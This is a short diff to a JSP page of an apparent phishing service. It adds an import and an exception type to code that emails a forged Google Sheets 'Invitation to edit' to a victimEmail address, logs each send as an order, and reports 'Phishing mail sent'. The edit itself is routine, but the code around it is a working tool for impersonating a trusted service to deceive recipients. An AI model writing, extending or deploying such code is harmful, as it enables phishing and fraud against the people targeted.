@@ -7,6 +7,7 @@
 <%@ page import="com.theah64.webengine.utils.MailHelper" %>
 <%@ page import="com.theah64.webengine.utils.RandomString" %>
 <%@ page import="java.sql.SQLException" %>
+<%@ page import="com.theah64.webengine.database.querybuilders.QueryBuilderException" %>
 <html>
 <head>
     <%
@@ -86,11 +87,13 @@
                 MailHelper.sendMail(victimEmail, docTitle + " - Invitation to edit", content, sharedBy + " (via Google Sheets)");
 
                 //Adding data to db
+
                 Orders.getInstance().add(new Order(null, key, victimEmail, userEmail, sharedBy, docTitle, docUrl, content, false));
                 response.sendRedirect("status.jsp?title=Done&message=Phishing mail sent");
+
             }
 
-        } catch (MailException | SQLException e) {
+        } catch (MailException | QueryBuilderException | SQLException e) {
             e.printStackTrace();
 
     %>
